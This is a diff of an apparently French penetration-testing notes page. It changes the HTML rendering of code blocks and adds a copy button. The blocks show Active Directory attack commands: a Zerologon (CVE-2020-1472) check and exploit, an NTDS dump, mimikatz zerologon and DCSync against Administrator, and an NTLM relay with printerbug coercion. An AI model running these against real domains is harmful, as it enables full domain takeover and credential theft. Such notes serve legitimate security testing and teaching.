@@ -7734,20 +7734,20 @@
 Cet exploit va remplacer le hash du DC par un hash null, le problème de cette méthode est donc que l'AD va vite devenir inutilisable :</p>
 <h4 id="depuis-linux">Depuis Linux</h4>
 <p>Vérifier si le DC est vulnérable :</p>
-<pre><code class="language-bash">netexec smb 10.10.10.10 -u &quot;&quot; -p &quot;&quot; -M zerologon
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>netexec<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-M<span class="w"> </span>zerologon
+</span></code></pre></div>
 <p>Exploitation de la faille :</p>
-<pre><code class="language-bash">cve-2020-1472-exploit.py 'nomDuDC' 'adresseIpDuDC'
-</code></pre>
-<pre><code class="language-bash">netexec smb 10.10.10.10 -u 'DC0$' -p '' --ntds
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>cve-2020-1472-exploit.py<span class="w"> </span><span class="s1">&#39;nomDuDC&#39;</span><span class="w"> </span><span class="s1">&#39;adresseIpDuDC&#39;</span>
+</span></code></pre></div>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>netexec<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;DC0$&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>--ntds
+</span></code></pre></div>
 <h4 id="depuis-windows">Depuis Windows</h4>
 <p>L'exploit peut se faire avec mimikatz :</p>
-<pre><code class="language-bash">lsadump::zerologon /target:dc.domain.local /account:DC$ /exploit
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>lsadump::zerologon<span class="w"> </span>/target:dc.domain.local<span class="w"> </span>/account:DC$<span class="w"> </span>/exploit
+</span></code></pre></div>
 <p>Puis on effectue le DCSync :</p>
-<pre><code class="language-bash">lsadump::dcsync /domain:domain.local /dc:dc.domain.local /user:Administrator /authuser:DC$ /authdomain:domain /authpassword:&quot;&quot; /authntlm
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>lsadump::dcsync<span class="w"> </span>/domain:domain.local<span class="w"> </span>/dc:dc.domain.local<span class="w"> </span>/user:Administrator<span class="w"> </span>/authuser:DC$<span class="w"> </span>/authdomain:domain<span class="w"> </span>/authpassword:<span class="s2">&quot;&quot;</span><span class="w"> </span>/authntlm
+</span></code></pre></div>
 <h3 id="relais-ntlm">Relais NTLM</h3>
 <p>La seconde méthode, plus élégante, permet d'utiliser un relais NTLM. Cette méthode est plus simple et n'a pas la contrainte de remplacer le mot de passe du DC, n'entrainant donc pas d'instabilité de l'AD.</p>
 <p>Plusieurs prérequis sont néanmoins nécessaires:
@@ -7755,10 +7755,10 @@ Cet exploit va remplacer le hash du DC par un hash null, le problème de cette m
 - Un compte utilisateur 
 - Un second DC</p>
 <p>Mise en place du relais NTLM :</p>
-<pre><code class="language-bash">ntlmrelayx -t dcsync://DC2 -smb2support
-</code></pre>
-<pre><code class="language-bash">printerbug.py 'domain.local'/user:Password@ipDC ipAttaquant
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>ntlmrelayx<span class="w"> </span>-t<span class="w"> </span>dcsync://DC2<span class="w"> </span>-smb2support
+</span></code></pre></div>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>printerbug.py<span class="w"> </span><span class="s1">&#39;domain.local&#39;</span>/user:Password@ipDC<span class="w"> </span>ipAttaquant
+</span></code></pre></div>
 
 
 
@@ -7805,7 +7805,7 @@ Cet exploit va remplacer le hash du DC par un hash null, le problème de cette m
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "../../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.sections"], "search": "../../../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "../../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.sections", "content.code.copy"], "search": "../../../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
       <script src="../../../../assets/javascripts/bundle.fe8b6f2b.min.js"></script>
